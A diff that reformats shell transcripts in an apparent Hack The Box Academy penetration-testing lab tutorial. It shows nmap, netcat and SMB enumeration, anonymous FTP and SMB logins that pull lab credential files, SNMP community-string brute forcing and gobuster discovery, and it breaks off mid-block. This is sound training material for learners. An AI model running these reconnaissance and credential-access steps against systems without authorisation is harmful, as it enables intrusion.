@@ -140,7 +140,28 @@ When attacking a single box, lab, or client environment, we should have a clear 
 Staying Organized
 
 ```shell
-6165@htb[/htb]$ tree Projects/ Projects/ └── Acme Company ├── EPT │ ├── evidence │ │ ├── credentials │ │ ├── data │ │ └── screenshots │ ├── logs │ ├── scans │ ├── scope │ └── tools └── IPT ├── evidence │ ├── credentials │ ├── data │ └── screenshots ├── logs ├── scans ├── scope └── tools
+6165@htb[/htb]$ tree Projects/
+
+Projects/
+└── Acme Company
+    ├── EPT
+    │   ├── evidence
+    │   │   ├── credentials
+    │   │   ├── data
+    │   │   └── screenshots
+    │   ├── logs
+    │   ├── scans
+    │   ├── scope
+    │   └── tools
+    └── IPT
+        ├── evidence
+        │   ├── credentials
+        │   ├── data
+        │   └── screenshots
+        ├── logs
+        ├── scans
+        ├── scope
+        └── tools
 ```
 
 Here we have a folder for the client `Acme Company` with two assessments, Internal Penetration Test (IPT) and External Penetration Test (EPT). Under each folder, we have subfolders for saving scan data, any relevant tools, logging output, scoping information (i.e., lists of IPs/networks to feed to our scanning tools), and an evidence folder that may contain any credentials retrieved during the assessment, any relevant data retrieved as well as screenshots.
@@ -201,7 +222,17 @@ HTB and other services offering purposefully vulnerable VMs/networks require pla
 Connecting Using VPN
 
 ```shell
-6165@htb[/htb]$ sudo openvpn user.ovpn Thu Dec 10 18:42:41 2020 OpenVPN 2.4.9 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on Apr 21 2020 Thu Dec 10 18:42:41 2020 library versions: OpenSSL 1.1.1g 21 Apr 2020, LZO 2.10 Thu Dec 10 18:42:41 2020 Outgoing Control Channel Authentication: Using 256 bit message hash 'SHA256' for HMAC authentication Thu Dec 10 18:42:41 2020 Incoming Control Channel Authentication: Using 256 bit message hash 'SHA256' for HMAC authentication Thu Dec 10 18:42:41 2020 TCP/UDP: Preserving recently used remote address: [AF_INET] Thu Dec 10 18:42:41 2020 Socket Buffers: R=[212992->212992] S=[212992->212992] Thu Dec 10 18:42:41 2020 UDP link local: (not bound) <SNIP> Thu Dec 10 18:42:41 2020 Initialization Sequence Completed
+6165@htb[/htb]$ sudo openvpn user.ovpn
+
+Thu Dec 10 18:42:41 2020 OpenVPN 2.4.9 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on Apr 21 2020
+Thu Dec 10 18:42:41 2020 library versions: OpenSSL 1.1.1g  21 Apr 2020, LZO 2.10
+Thu Dec 10 18:42:41 2020 Outgoing Control Channel Authentication: Using 256 bit message hash 'SHA256' for HMAC authentication
+Thu Dec 10 18:42:41 2020 Incoming Control Channel Authentication: Using 256 bit message hash 'SHA256' for HMAC authentication
+Thu Dec 10 18:42:41 2020 TCP/UDP: Preserving recently used remote address: [AF_INET]
+Thu Dec 10 18:42:41 2020 Socket Buffers: R=[212992->212992] S=[212992->212992]
+Thu Dec 10 18:42:41 2020 UDP link local: (not bound)
+<SNIP>
+Thu Dec 10 18:42:41 2020 Initialization Sequence Completed
 ```
 
 The last line `Initialization Sequence Completed` tells us that we successfully connected to the VPN.
@@ -211,7 +242,15 @@ Where `sudo` tells our host to run the command as the elevated root user, `openv
 Connecting Using VPN
 
 ```shell
-6165@htb[/htb]$ ifconfig <SNIP> tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST> mtu 1500 inet 10.10.x.2 netmask 255.255.254.0 destination 10.10.x.2 inet6 dead:beef:1::2000 prefixlen 64 scopeid 0x0<global> inet6 fe80::d82f:301a:a94a:8723 prefixlen 64 scopeid 0x20<link> unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00 txqueuelen
+6165@htb[/htb]$ ifconfig
+
+<SNIP>
+
+tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
+        inet 10.10.x.2  netmask 255.255.254.0  destination 10.10.x.2
+        inet6 dead:beef:1::2000  prefixlen 64  scopeid 0x0<global>
+        inet6 fe80::d82f:301a:a94a:8723  prefixlen 64  scopeid 0x20<link>
+        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen
 ```
 
 Typing `netstat -rn` will show us the networks accessible via the VPN.
@@ -219,7 +258,14 @@ Typing `netstat -rn` will show us the networks accessible via the VPN.
 Connecting Using VPN
 
 ```shell
-6165@htb[/htb]$ netstat -rn Kernel IP routing table Destination Gateway Genmask Flags MSS Window irtt Iface 0.0.0.0 192.168.1.2 0.0.0.0 UG 0 0 0 eth0 10.10.14.0 0.0.0.0 255.255.254.0 U 0 0 0 tun0 10.129.0.0 10.10.14.1 255.255.0.0 UG 0 0 0 tun0 192.168.1.0 0.0.0.0 255.255.255.0 U 0 0 0 eth0
+6165@htb[/htb]$ netstat -rn
+
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
+0.0.0.0         192.168.1.2     0.0.0.0         UG        0 0          0 eth0
+10.10.14.0      0.0.0.0         255.255.254.0   U         0 0          0 tun0
+10.129.0.0      10.10.14.1      255.255.0.0     UG        0 0          0 tun0
+192.168.1.0     0.0.0.0         255.255.255.0   U         0 0          0 eth0
 ```
 
 Here can see that the 10.129.0.0/16 network used for HTB Academy machines is accessible via the `tun0` adapter via the 10.10.14.0/23 network.
@@ -332,7 +378,11 @@ SSH uses a client-server model, connecting a user running an SSH client applicat
 Basic Tools
 
 ```shell
-6165@htb[/htb]$ ssh Bob@10.10.10.10 Bob@remotehost's password: ********* Bob@remotehost#
+6165@htb[/htb]$ ssh Bob@10.10.10.10
+
+Bob@remotehost's password: *********
+
+Bob@remotehost#
 ```
 
 It is also possible to read local private keys on a compromised system or add our public key to gain SSH access to a specific user, as we'll discuss in a later section. As we can see, SSH is an excellent tool for securely connecting to a remote machine. It also provides a way for mapping local ports on the remote machine to our localhost, which can become handy at times.
@@ -346,7 +396,9 @@ ___
 Basic Tools
 
 ```shell
-6165@htb[/htb]$ netcat 10.10.10.10 22 SSH-2.0-OpenSSH_8.4p1 Debian-3
+6165@htb[/htb]$ netcat 10.10.10.10 22
+
+SSH-2.0-OpenSSH_8.4p1 Debian-3
 ```
 
 As we can see, port 22 sent us its banner, stating that `SSH` is running on it. This technique is called `Banner Grabbing`, and can help identify what service is running on a particular port. `Netcat` comes pre-installed in most Linux distributions. We can also download a copy for Windows machines from this [link](https://nmap.org/download.html). There's another Windows alternative to `netcat` coded in PowerShell called [PowerCat](https://github.com/besimorhino/powercat). `Netcat` can also be used to transfer files between machines, as we'll discuss later.
@@ -440,7 +492,20 @@ Let us start with the most basic scan. Suppose that we want to perform a basic s
 Service Scanning
 
 ```shell
-6165@htb[/htb]$ nmap 10.129.42.253 Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-25 16:07 EST Nmap scan report for 10.129.42.253 Host is up (0.11s latency). Not shown: 995 closed ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http 139/tcp open netbios-ssn 445/tcp open microsoft-ds Nmap done: 1 IP address (1 host up) scanned in 2.19 seconds
+6165@htb[/htb]$ nmap 10.129.42.253
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-25 16:07 EST
+Nmap scan report for 10.129.42.253
+Host is up (0.11s latency).
+Not shown: 995 closed ports
+PORT    STATE SERVICE
+21/tcp  open  ftp
+22/tcp  open  ssh
+80/tcp  open  http
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+Nmap done: 1 IP address (1 host up) scanned in 2.19 seconds
 ```
 
 Under the `PORT` heading, it also tells us that these are TCP ports. By default, `Nmap` will conduct a TCP scan unless specifically requested to perform a UDP scan.  
@@ -454,7 +519,48 @@ We can use the `-sC` parameter to specify that `Nmap` scripts should be used to 
 Service Scanning
 
 ```shell
-6165@htb[/htb]$ nmap -sV -sC -p- 10.129.42.253 Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-25 16:18 EST Nmap scan report for 10.129.42.253 Host is up (0.11s latency). Not shown: 65530 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_drwxr-xr-x 2 ftp ftp 4096 Feb 25 19:25 pub | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.10.14.2 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 2 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: PHP 7.4.3 - phpinfo() 139/tcp open netbios-ssn Samba smbd 4.6.2 445/tcp open netbios-ssn Samba smbd 4.6.2 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_nbstat: NetBIOS name: GS-SVCSCAN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-02-25T21:21:51 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 233.68 seconds
+6165@htb[/htb]$ nmap -sV -sC -p- 10.129.42.253
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-25 16:18 EST
+Nmap scan report for 10.129.42.253
+Host is up (0.11s latency).
+Not shown: 65530 closed ports
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x    2 ftp      ftp          4096 Feb 25 19:25 pub
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.14.2
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: PHP 7.4.3 - phpinfo()
+139/tcp open  netbios-ssn Samba smbd 4.6.2
+445/tcp open  netbios-ssn Samba smbd 4.6.2
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_nbstat: NetBIOS name: GS-SVCSCAN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-02-25T21:21:51
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 233.68 seconds
 ```
 
 This returns a lot more information. We see that it took a lot longer to scan 65,535 ports than 1,000 ports. The `-sC` and `-sV` options also increase the duration of a scan, as instead of performing a simple TCP handshake, they perform a lot more checks. We notice that this time there is a VERSION heading, which reports the service version and the operating system if this is possible to identify.
@@ -478,7 +584,13 @@ Specifying `-sC` will run many useful default scripts against a target, but ther
 Service Scanning
 
 ```shell
-6165@htb[/htb]$ locate scripts/citrix /usr/share/nmap/scripts/citrix-brute-xml.nse /usr/share/nmap/scripts/citrix-enum-apps-xml.nse /usr/share/nmap/scripts/citrix-enum-apps.nse /usr/share/nmap/scripts/citrix-enum-servers-xml.nse /usr/share/nmap/scripts/citrix-enum-servers.nse
+6165@htb[/htb]$ locate scripts/citrix
+
+/usr/share/nmap/scripts/citrix-brute-xml.nse
+/usr/share/nmap/scripts/citrix-enum-apps-xml.nse
+/usr/share/nmap/scripts/citrix-enum-apps.nse
+/usr/share/nmap/scripts/citrix-enum-servers-xml.nse
+/usr/share/nmap/scripts/citrix-enum-servers.nse
 ```
 
 The syntax for running an Nmap script is `nmap --script <script name> -p<port> <host>`. `Nmap` scripts are a great way to enhance our scans' functionality, and inspection of the available options will pay dividends. Check out the [Network Enumeration with Nmap](https://academy.hackthebox.com/module/details/19) module for a more detailed study of the `Nmap` tool.
@@ -494,7 +606,10 @@ As previously discussed, banner grabbing is a useful technique to fingerprint a 
 Service Scanning
 
 ```shell
-6165@htb[/htb]$ nc -nv 10.129.42.253 21 (UNKNOWN) [10.129.42.253] 21 (ftp) open 220 (vsFTPd 3.0.3)
+6165@htb[/htb]$ nc -nv 10.129.42.253 21
+
+(UNKNOWN) [10.129.42.253] 21 (ftp) open
+220 (vsFTPd 3.0.3)
 ```
 
 This reveals that the version of `vsFTPd` on the server is `3.0.3`. We can also automate this process using `Nmap's` powerful scripting engine: `nmap -sV --script=banner -p21 10.10.10.0/24`.
@@ -506,7 +621,33 @@ It is worth gaining familiarity with FTP, as it is a standard protocol, and this
 Service Scanning
 
 ```shell
-6165@htb[/htb]$ nmap -sC -sV -p21 10.129.42.253 Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-20 00:54 GMT Nmap scan report for 10.129.42.253 Host is up (0.081s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_drwxr-xr-x 2 ftp ftp 4096 Dec 19 23:50 pub | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.10.14.2 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3.0.3 - secure, fast, stable |_End of status Service Info: OS: Unix Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 1.78 seconds
+6165@htb[/htb]$ nmap -sC -sV -p21 10.129.42.253
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-20 00:54 GMT
+Nmap scan report for 10.129.42.253
+Host is up (0.081s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x    2 ftp      ftp          4096 Dec 19 23:50 pub
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.14.2
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+Service Info: OS: Unix
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1.78 seconds
 ```
 
 Let us connect to the service using the `ftp` command-line utility.
@@ -514,7 +655,39 @@ Let us connect to the service using the `ftp` command-line utility.
 Service Scanning
 
 ```shell
-6165@htb[/htb]$ ftp -p 10.129.42.253 Connected to 10.129.42.253. 220 (vsFTPd 3.0.3) Name (10.129.42.253:user): anonymous 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp> ls 227 Entering Passive Mode (10,129,42,253,158,60). 150 Here comes the directory listing. drwxr-xr-x 2 ftp ftp 4096 Feb 25 19:25 pub 226 Directory send OK. ftp> cd pub 250 Directory successfully changed. ftp> ls 227 Entering Passive Mode (10,129,42,253,182,129). 150 Here comes the directory listing. -rw-r--r-- 1 ftp ftp 18 Feb 25 19:25 login.txt 226 Directory send OK. ftp> get login.txt local: login.txt remote: login.txt 227 Entering Passive Mode (10,129,42,253,181,53). 150 Opening BINARY mode data connection for login.txt (18 bytes). 226 Transfer complete. 18 bytes received in 0.00 secs (165.8314 kB/s) ftp> exit 221 Goodbye.
+6165@htb[/htb]$ ftp -p 10.129.42.253
+
+Connected to 10.129.42.253.
+220 (vsFTPd 3.0.3)
+Name (10.129.42.253:user): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+
+ftp> ls
+227 Entering Passive Mode (10,129,42,253,158,60).
+150 Here comes the directory listing.
+drwxr-xr-x    2 ftp      ftp          4096 Feb 25 19:25 pub
+226 Directory send OK.
+
+ftp> cd pub
+250 Directory successfully changed.
+
+ftp> ls
+227 Entering Passive Mode (10,129,42,253,182,129).
+150 Here comes the directory listing.
+-rw-r--r--    1 ftp      ftp            18 Feb 25 19:25 login.txt
+226 Directory send OK.
+
+ftp> get login.txt
+local: login.txt remote: login.txt
+227 Entering Passive Mode (10,129,42,253,181,53).
+150 Opening BINARY mode data connection for login.txt (18 bytes).
+226 Transfer complete.
+18 bytes received in 0.00 secs (165.8314 kB/s)
+
+ftp> exit
+221 Goodbye.
 ```
 
 In the above shell, we see that FTP supports common commands such as `cd` and `ls` and allows us to download files using the `get` command. Inspection of the downloaded `login.txt` reveals credentials that we could use to further our access to the system.
@@ -522,7 +695,9 @@ In the above shell, we see that FTP supports common commands such as `cd` and `l
 Service Scanning
 
 ```shell
-6165@htb[/htb]$ cat login.txt admin:ftp@dmin123
+6165@htb[/htb]$ cat login.txt
+
+admin:ftp@dmin123
 ```
 
 ___
@@ -534,7 +709,25 @@ SMB (Server Message Block) is a prevalent protocol on Windows machines that prov
 Service Scanning
 
 ```shell
-6165@htb[/htb]$ nmap --script smb-os-discovery.nse -p445 10.10.10.40 Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-27 00:59 GMT Nmap scan report for doctors.htb (10.10.10.40) Host is up (0.022s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Host script results: | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: CEO-PC | NetBIOS computer name: CEO-PC\x00 | Workgroup: WORKGROUP\x00 |_ System time: 2020-12-27T00:59:46+00:00 Nmap done: 1 IP address (1 host up) scanned in 2.71 seconds
+6165@htb[/htb]$ nmap --script smb-os-discovery.nse -p445 10.10.10.40
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-27 00:59 GMT
+Nmap scan report for doctors.htb (10.10.10.40)
+Host is up (0.022s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-os-discovery: 
+|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: CEO-PC
+|   NetBIOS computer name: CEO-PC\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2020-12-27T00:59:46+00:00
+
+Nmap done: 1 IP address (1 host up) scanned in 2.71 seconds
 ```
 
 In this case, the host runs a legacy Windows 7 OS, and we could conduct further enumeration to confirm if it is vulnerable to EternalBlue. The Metasploit Framework has several [modules](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/) for EternalBlue that can be used to validate the vulnerability and exploit it, as we will see in a coming section. We can run a scan against our target for this module section to gather information from the SMB service. We can ascertain that the host runs a Linux kernel, Samba version 4.6.2, and the hostname is GS-SVCSCAN.
@@ -542,7 +735,35 @@ In this case, the host runs a legacy Windows 7 OS, and we could conduct further 
 Service Scanning
 
 ```shell
-6165@htb[/htb]$ nmap -A -p445 10.129.42.253 Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-25 16:29 EST Nmap scan report for 10.129.42.253 Host is up (0.11s latency). PORT STATE SERVICE VERSION 445/tcp open netbios-ssn Samba smbd 4.6.2 Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 2.6.32 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Host script results: |_nbstat: NetBIOS name: GS-SVCSCAN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-02-25T21:30:06 |_ start_date: N/A TRACEROUTE (using port 445/tcp) HOP RTT ADDRESS 1 111.62 ms 10.10.14.1 2 111.89 ms 10.129.42.253 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 12.72 seconds
+6165@htb[/htb]$ nmap -A -p445 10.129.42.253
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-25 16:29 EST
+Nmap scan report for 10.129.42.253
+Host is up (0.11s latency).
+
+PORT    STATE SERVICE     VERSION
+445/tcp open  netbios-ssn Samba smbd 4.6.2
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 2.6.32 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+
+Host script results:
+|_nbstat: NetBIOS name: GS-SVCSCAN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-02-25T21:30:06
+|_  start_date: N/A
+
+TRACEROUTE (using port 445/tcp)
+HOP RTT       ADDRESS
+1   111.62 ms 10.10.14.1
+2   111.89 ms 10.129.42.253
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.72 seconds
 ```
 
 ___
@@ -554,7 +775,14 @@ SMB allows users and administrators to share folders and make them accessible re
 Service Scanning
 
 ```shell
-6165@htb[/htb]$ smbclient -N -L \\\\10.129.42.253 Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers users Disk IPC$ IPC IPC Service (gs-svcscan server (Samba, Ubuntu)) SMB1 disabled -- no workgroup available
+6165@htb[/htb]$ smbclient -N -L \\\\10.129.42.253
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	users           Disk      
+	IPC$            IPC       IPC Service (gs-svcscan server (Samba, Ubuntu))
+SMB1 disabled -- no workgroup available
 ```
 
 This reveals the non-default share `users`. Let us attempt to connect as the guest user.
@@ -562,7 +790,15 @@ This reveals the non-default share `users`. Let us attempt to connect as the gue
 Service Scanning
 
 ```shell
-6165@htb[/htb]$ smbclient \\\\10.129.42.253\\users Enter WORKGROUP\users's password: Try "help" to get a list of possible commands. smb: \> ls NT_STATUS_ACCESS_DENIED listing \* smb: \> exit
+6165@htb[/htb]$ smbclient \\\\10.129.42.253\\users
+
+Enter WORKGROUP\users's password: 
+Try "help" to get a list of possible commands.
+
+smb: \> ls
+NT_STATUS_ACCESS_DENIED listing \*
+
+smb: \> exit
 ```
 
 The `ls` command resulted in an access denied message, indicating that guest access is not permitted. Let us try again using credentials for the user bob (`bob:Welcome1`).
@@ -570,7 +806,29 @@ The `ls` command resulted in an access denied message, indicating that guest acc
 Service Scanning
 
 ```shell
-6165@htb[/htb]$ smbclient -U bob \\\\10.129.42.253\\users Enter WORKGROUP\bob's password: Try "help" to get a list of possible commands. smb: \> ls . D 0 Thu Feb 25 16:42:23 2021 .. D 0 Thu Feb 25 15:05:31 2021 bob D 0 Thu Feb 25 16:42:23 2021 4062912 blocks of size 1024. 1332480 blocks available smb: \> cd bob smb: \bob\> ls . D 0 Thu Feb 25 16:42:23 2021 .. D 0 Thu Feb 25 16:42:23 2021 passwords.txt N 156 Thu Feb 25 16:42:23 2021 4062912 blocks of size 1024. 1332480 blocks available smb: \bob\> get passwords.txt getting file \bob\passwords.txt of size 156 as passwords.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
+6165@htb[/htb]$ smbclient -U bob \\\\10.129.42.253\\users
+
+Enter WORKGROUP\bob's password: 
+Try "help" to get a list of possible commands.
+
+smb: \> ls
+  .                                   D        0  Thu Feb 25 16:42:23 2021
+  ..                                  D        0  Thu Feb 25 15:05:31 2021
+  bob                                 D        0  Thu Feb 25 16:42:23 2021
+
+		4062912 blocks of size 1024. 1332480 blocks available
+		
+smb: \> cd bob
+
+smb: \bob\> ls
+  .                                   D        0  Thu Feb 25 16:42:23 2021
+  ..                                  D        0  Thu Feb 25 16:42:23 2021
+  passwords.txt                       N      156  Thu Feb 25 16:42:23 2021
+
+		4062912 blocks of size 1024. 1332480 blocks available
+		
+smb: \bob\> get passwords.txt 
+getting file \bob\passwords.txt of size 156 as passwords.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
 ```
 
 We successfully gained access to the `users` share using credentials and gained access to the interesting file `passwords.txt`, which can be downloaded with the `get` command.
@@ -584,13 +842,17 @@ SNMP Community strings provide information and statistics about a router or devi
 Service Scanning
 
 ```shell
-6165@htb[/htb]$ snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0 iso.3.6.1.2.1.1.5.0 = STRING: "gs-svcscan"
+6165@htb[/htb]$ snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0 
+
+iso.3.6.1.2.1.1.5.0 = STRING: "gs-svcscan"
 ```
 
 Service Scanning
 
 ```shell
-6165@htb[/htb]$ snmpwalk -v 2c -c private 10.129.42.253 Timeout: No Response from 10.129.42.253
+6165@htb[/htb]$ snmpwalk -v 2c -c private 10.129.42.253
+
+Timeout: No Response from 10.129.42.253
 ```
 
 A tool such as [onesixtyone](https://github.com/trailofbits/onesixtyone) can be used to brute force the community string names using a dictionary file of common community strings such as the `dict.txt` file included in the GitHub repo for the tool.
@@ -598,7 +860,10 @@ A tool such as [onesixtyone](https://github.com/trailofbits/onesixtyone) can be 
 Service Scanning
 
 ```shell
-6165@htb[/htb]$ onesixtyone -c dict.txt 10.129.42.254 Scanning 1 hosts, 51 communities 10.129.42.254 [public] Linux gs-svcscan 5.4.0-66-generic #74-Ubuntu SMP Wed Jan 27 22:54:38 UTC 2021 x86_64
+6165@htb[/htb]$ onesixtyone -c dict.txt 10.129.42.254
+
+Scanning 1 hosts, 51 communities
+10.129.42.254 [public] Linux gs-svcscan 5.4.0-66-generic #74-Ubuntu SMP Wed Jan 27 22:54:38 UTC 2021 x86_64
 ```
 
 ___
@@ -627,7 +892,30 @@ GoBuster is a versatile tool that allows for performing DNS, vhost, and director
 Web Enumeration
 
 ```shell
-6165@htb[/htb]$ gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.10.121/ [+] Threads: 10 [+] Wordlist: /usr/share/dirb/wordlists/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/12/11 21:47:25 Starting gobuster =============================================================== /.hta (Status: 403) /.htpasswd (Status: 403) /.htaccess (Status: 403) /index.php (Status: 200) /server-status (Status: 403) /wordpress (Status: 301) =============================================================== 2020/12/11 21:47:46 Finished ===============================================================
+6165@htb[/htb]$ gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt
+
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.121/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/dirb/wordlists/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/12/11 21:47:25 Starting gobuster
+===============================================================
+/.hta (Status: 403)
+/.htpasswd (Status: 403)
+/.htaccess (Status: 403)
+/index.php (Status: 200)
+/server-status (Status: 403)
+/wordpress (Status: 301)
+===============================================================
+2020/12/11 21:47:46 Finished
+===============================================================
 ```
 
 An HTTP status code of `200` reveals that the resource's request was successful, while a 403 HTTP status code indicates that we are forbidden to access the resource. A 301 status code indicates that we are being redirected, which is not a failure case. It is worth familiarizing ourselves with the various HTTP status codes, which can be found [here](https://en.wikipedia.org/wiki/List_of_HTTP_status_codes). The `Web Requests` Academy Module also covers HTTP status codes further in-depth.
@@ -659,7 +947,28 @@ Next, add a DNS Server such as 1.1.1.1 to the `/etc/resolv.conf` file. We will t
 Web Enumeration
 
 ```shell
-6165@htb[/htb]$ gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_) =============================================================== [+] Domain: inlanefreight.com [+] Threads: 10 [+] Timeout: 1s [+] Wordlist: /usr/share/SecLists/Discovery/DNS/namelist.txt =============================================================== 2020/12/17 23:08:55 Starting gobuster =============================================================== Found: blog.inlanefreight.com Found: customer.inlanefreight.com Found: my.inlanefreight.com Found: ns1.inlanefreight.com Found: ns2.inlanefreight.com Found: ns3.inlanefreight.com =============================================================== 2020/12/17 23:10:34 Finished ===============================================================
+6165@htb[/htb]$ gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
+
+===============================================================
+Gobuster v3.0.1
